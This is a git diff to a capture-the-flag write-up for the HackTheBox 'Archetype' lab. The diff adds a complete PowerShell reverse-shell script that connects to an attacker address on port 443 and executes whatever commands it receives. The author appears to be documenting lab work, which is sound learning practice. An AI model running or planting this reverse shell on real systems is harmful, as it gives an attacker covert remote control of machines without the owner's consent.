@@ -159,6 +159,18 @@ The **whoami** command responsed with **archetype\sql_svc** which is the expecte
 
 ### PowerShell Reverse Shell
 Using **PowerShell** we can mock up a quick file that'll get us connected with a **netcat** listener. I named my file [**shell.ps1**](https://github.com/jessisec/ctf-writeups/blob/main/HackTheBox/Archetype/shell.ps1). With the file created, I just needed to transfer it to our target.  
+**Shell.ps1**  
+~~~Powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + "# ";
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};$client.Close()
+~~~
 I used **Python's** http.server module to accomplish this.
 ~~~Bash
 ┌──(jessi㉿teatimesec)-[~/HTB/Archetype]
